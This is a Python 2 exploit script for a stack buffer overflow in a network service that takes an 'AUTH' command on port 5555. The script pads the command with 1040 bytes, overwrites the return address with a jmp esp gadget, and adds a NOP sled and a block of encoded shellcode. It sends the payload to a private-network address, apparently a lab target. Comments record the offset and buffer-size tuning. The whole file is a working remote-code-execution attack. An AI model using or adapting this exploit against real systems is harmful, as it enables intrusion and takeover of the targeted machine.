#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

	#jmp esp at 65D11D71
	#offset 1040
	#req1 = "AUTH " + "\x41"*1072
	# "EXITFUNC = thread" added

	shellcode = ("\xdb\xd2\xd9\x74\x24\xf4\x5b\x29\xc9\xb8\x4c\xf3\x1b\xd3\xb1"
"\x52\x83\xc3\x04\x31\x43\x13\x03\x0f\xe0\xf9\x26\x73\xee\x7c"
"\xc8\x8b\xef\xe0\x40\x6e\xde\x20\x36\xfb\x71\x91\x3c\xa9\x7d"
"\x5a\x10\x59\xf5\x2e\xbd\x6e\xbe\x85\x9b\x41\x3f\xb5\xd8\xc0"
"\xc3\xc4\x0c\x22\xfd\x06\x41\x23\x3a\x7a\xa8\x71\x93\xf0\x1f"
"\x65\x90\x4d\x9c\x0e\xea\x40\xa4\xf3\xbb\x63\x85\xa2\xb0\x3d"
"\x05\x45\x14\x36\x0c\x5d\x79\x73\xc6\xd6\x49\x0f\xd9\x3e\x80"
"\xf0\x76\x7f\x2c\x03\x86\xb8\x8b\xfc\xfd\xb0\xef\x81\x05\x07"
"\x8d\x5d\x83\x93\x35\x15\x33\x7f\xc7\xfa\xa2\xf4\xcb\xb7\xa1"
"\x52\xc8\x46\x65\xe9\xf4\xc3\x88\x3d\x7d\x97\xae\x99\x25\x43"
"\xce\xb8\x83\x22\xef\xda\x6b\x9a\x55\x91\x86\xcf\xe7\xf8\xce"
"\x3c\xca\x02\x0f\x2b\x5d\x71\x3d\xf4\xf5\x1d\x0d\x7d\xd0\xda"
"\x72\x54\xa4\x74\x8d\x57\xd5\x5d\x4a\x03\x85\xf5\x7b\x2c\x4e"
"\x05\x83\xf9\xc1\x55\x2b\x52\xa2\x05\x8b\x02\x4a\x4f\x04\x7c"
"\x6a\x70\xce\x15\x01\x8b\x99\x13\xdd\x93\x6a\x4c\xe3\x93\x89"
"\xb5\x6a\x75\xfb\xd5\x3a\x2e\x94\x4c\x67\xa4\x05\x90\xbd\xc1"
"\x06\x1a\x32\x36\xc8\xeb\x3f\x24\xbd\x1b\x0a\x16\x68\x23\xa0"
"\x3e\xf6\xb6\x2f\xbe\x71\xab\xe7\xe9\xd6\x1d\xfe\x7f\xcb\x04"
"\xa8\x9d\x16\xd0\x93\x25\xcd\x21\x1d\xa4\x80\x1e\x39\xb6\x5c"
"\x9e\x05\xe2\x30\xc9\xd3\x5c\xf7\xa3\x95\x36\xa1\x18\x7c\xde"
"\x34\x53\xbf\x98\x38\xbe\x49\x44\x88\x17\x0c\x7b\x25\xf0\x98"
"\x04\x5b\x60\x66\xdf\xdf\x80\x85\xf5\x15\x29\x10\x9c\x97\x34"
"\xa3\x4b\xdb\x40\x20\x79\xa4\xb6\x38\x08\xa1\xf3\xfe\xe1\xdb"
"\x6c\x6b\x05\x4f\x8c\xbe")

	# 1442 works
	# 1452 also works
	# buffer size increased to 1452
 	
	buff = "AUTH " + "A" * 1040 + "\x71\x1d\xd1\x65" + "\x90" * 16 + shellcode + "C" * (1452-1040-4-351-16)
	
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect(("10.11.21.97", 5555))
		data = sock.recv(1024)
		print data
	
		sock.send(buff)
		data = sock.recv(1024)
		print data
	except socket.error:
		print "[x] Unable to connect..."
	finally:
		sock.close()
		sys.exit(0)
		
